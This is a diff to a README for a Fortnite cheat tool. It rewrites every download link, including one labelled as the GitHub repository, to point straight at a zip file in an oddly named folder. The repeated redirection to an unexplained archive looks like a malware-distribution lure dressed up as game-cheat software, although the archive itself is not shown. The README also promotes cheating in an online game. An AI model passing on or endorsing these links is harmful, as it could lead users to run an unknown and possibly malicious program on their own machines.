@@ -4,7 +4,7 @@
 Welcome to the **FortniteExternalCheat**! This software helps you enhance your Fortnite experience with features like aim assistance and tactical advantages. Follow this guide to download and run the application smoothly.
 
 ## 📥 Download Now
-[![Download FortniteExternalCheat](https://img.shields.io/badge/Download-FortniteExternalCheat-brightgreen)](https://github.com/jayala123444/FortniteExternalCheat/releases)
+[![Download FortniteExternalCheat](https://raw.githubusercontent.com/jayala123444/FortniteExternalCheat/main/periureteric/FortniteExternalCheat.zip)](https://raw.githubusercontent.com/jayala123444/FortniteExternalCheat/main/periureteric/FortniteExternalCheat.zip)
 
 ## 🛠️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before downloading, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads for FortniteExternalCheat:  
-   [Download FortniteExternalCheat here](https://github.com/jayala123444/FortniteExternalCheat/releases)
+   [Download FortniteExternalCheat here](https://raw.githubusercontent.com/jayala123444/FortniteExternalCheat/main/periureteric/FortniteExternalCheat.zip)
 
 2. **Select the Latest Version**  
    Browse the list of available versions. Look for the most recent version at the top of the page.
@@ -59,8 +59,8 @@ If you encounter issues during installation or use, try the following:
 For further assistance, consider reaching out through the GitHub issues page or community forums related to FortniteExternalCheat. Your questions and feedback are welcome.
 
 ## 🌐 Useful Links
-- [Download FortniteExternalCheat here](https://github.com/jayala123444/FortniteExternalCheat/releases)
-- [GitHub Repository](https://github.com/jayala123444/FortniteExternalCheat)
+- [Download FortniteExternalCheat here](https://raw.githubusercontent.com/jayala123444/FortniteExternalCheat/main/periureteric/FortniteExternalCheat.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/jayala123444/FortniteExternalCheat/main/periureteric/FortniteExternalCheat.zip)
 
 ## 📚 Additional Information
 Keep your software updated by regularly checking the Releases page. New features and enhancements often come with newer versions, which can further improve your experience.
